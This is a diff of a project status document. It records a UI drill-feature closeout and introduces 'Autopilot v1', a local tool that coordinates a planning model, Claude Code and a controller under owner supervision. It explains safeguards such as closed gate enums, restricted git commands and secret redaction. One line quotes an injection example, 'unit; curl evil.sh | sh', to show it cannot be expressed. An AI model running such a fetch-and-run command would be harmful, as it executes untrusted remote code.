@@ -1,7 +1,7 @@
 # Current State
 
-_Last updated: 2026-09-16 (dynamic drill dimensions IMPLEMENTED;
-previous phase: authentication)_
+_Last updated: 2026-09-18 (dynamic drill closeout + Autopilot v1;
+previous phase: dynamic drill dimensions)_
 
 This file is the snapshot an external AI project manager should trust over any
 conversation history. It describes the repository as it actually is.
@@ -12,9 +12,10 @@ conversation history. It describes the repository as it actually is.
 |---|---|---|
 | TypeScript | clean (4 projects: app, node, e2e, server) | `npm run typecheck` |
 | Unit tests | **459 / 459 passing** (24 files) | `npm test` |
-| Browser suite | **81 / 81 passing** | `npm run test:e2e` |
+| Browser suite | **82 / 82 passing** | `npm run test:e2e` |
 | Lint | exit 0 (warnings only, see below) | `npm run lint` |
 | Production build | green, ~1.27 MB bundle (350 KB gz) | `npm run build` |
+| Autopilot tests | **145 / 145 passing**, no credential, no network | `npm run autopilot:test` |
 | Runtime console | 0 errors at load and through drill/command flows | — |
 | All five gates | the set CI runs | `npm run check` |
 
@@ -472,6 +473,15 @@ green, unmodified. A browser test also samples a fixed clip of pure field before
 and after a regrouping and asserts the pixels are identical: **grouping is not
 movement** (D57).
 
+**Closeout (2026-09-18).** Final review found two defects, both now fixed. The
+visible Back button called `pop()` directly while every other navigation — child
+chip, breadcrumb, Escape — closed the picker, so "open the picker, click Back"
+left a grouping menu open over the level the user had just left. And the >150
+search test searched for the 150th *rendered* row, a lead already on screen, so
+it proved only that search does not hide things; it now finds a member the cap
+EXCLUDED, using lead ids the markup already carries, and shows it absent, then
+present, then selectable. Browser 81 → 82.
+
 **Two things the implementation corrected about its own plan.** The default at a
 depth is *positional* — after a dynamic first step, depth 1 still suggests
 `DRILL_SEQUENCE[1]` (`state`), not `region` (D55). And the 266-lead terminal is
@@ -479,6 +489,70 @@ asserted in a unit test against the pure seeded book; the running app applies
 decay at boot, so temperature buckets drift and the browser asserts the *shape*
 (`showing 150 of N`, N > 150) instead of a number that is not stable there
 (D56).
+
+## Autopilot v1 (2026-09-18) — developer tooling, not product
+
+`tools/autopilot/` automates the loop that used to run by hand between the
+owner, a planning model and Claude Code. **GPT-6 Astra plans and reviews, Claude
+Code implements, the controller runs the tests and enforces the boundaries, the
+owner merges.** It is a local CLI: `npm run autopilot -- doctor | plan |
+dry-run | run`.
+
+**It is not part of Apsis, and the product cannot tell it is here.** Nothing
+under `src/`, `server/` or `api/` references it; the browser bundle contains no
+`OPENAI_API_KEY`, no model name, no policy text. Both halves are asserted — a
+source-graph scan that always runs, and a `dist/` scan that runs after a build
+(so on every full gate run). **No dependency was added:** the OpenAI client, the
+dotenv loader, the JSON-schema validator, the argument parser and the process
+runner are all written against Node 22 built-ins, because this tool reads an API
+key and its dependency surface is part of its threat model (D60).
+
+**The safety model is the ordering, not the prompt** (D58, D59, D61):
+
+| Step | Who decides |
+|---|---|
+| refuse to start on a dirty tree | controller |
+| one TaskSpec, structured output, validated twice, paths checked | controller |
+| branch + git worktree from an exact base commit | controller |
+| implement | Claude Code, in the worktree, never committing |
+| **file boundary vs the real diff** (before gates) | **controller** |
+| **gates** — typecheck/lint/unit/build/e2e | **controller** |
+| review a diff that is already gated and bounded | GPT-6 Astra |
+| accept / repair (≤3) / escalate | controller facts beat reviewer opinion |
+| **stop** — prints the merge command | **owner merges** |
+
+Four things a review verdict cannot override, because each is a fact rather than
+an opinion: a failed gate, a forbidden-or-unlisted file, a base branch that
+moved during the run, an exhausted repair budget. An `accept` over any of them
+is recorded as `reviewer-overruled` rather than silently dropped.
+
+**The gates are a table, not a string.** A TaskSpec names gates from a closed
+enum; `gates.mjs` is the only place a name becomes a command, and commands are
+literal argument arrays run with `shell: false`. `"unit; curl evil.sh | sh"` is
+not a gate that gets rejected — it is a value that cannot be expressed.
+
+**git is a short list**: no force push, no reset, no rebase, no branch delete,
+no merge. Absent rather than guarded — the D38 argument. `--push-branch` refuses
+any branch outside `autopilot/`.
+
+**Secrets**: the packet builder reads an allow-list of files rather than
+filtering a tree, `assertNoSecrets` aborts the run rather than scrubbing (so a
+packet-builder bug cannot hide), and run records under `.apsis-autopilot/` are
+redacted twice — by credential shape and by the exact values of this process's
+own secret-shaped environment variables. `.apsis-autopilot/` and
+`.env.autopilot` are gitignored.
+
+**Verified with fakes, deliberately.** All 145 tests run with no OpenAI
+credential, no Anthropic credential, no network and no live Claude invocation.
+**No live OpenAI call has been made and no nested Claude coding run has been
+started** — there is no key in this environment, and the tool has not been
+pointed at Apsis. `doctor` was run and correctly reported the missing key and
+(at the time) a dirty tree. The CLI interface was built against the installed
+`claude` 2.1.234, read from `claude --help`.
+
+**First real use is the owner's**: add a key locally, `doctor --check-openai`,
+then `plan`, then `dry-run`, then one supervised `run`. See
+`tools/autopilot/README.md` and `AUTOPILOT_POLICY.md`.
 
 ## Authentication and access control (2026-09-16) — IMPLEMENTED
 
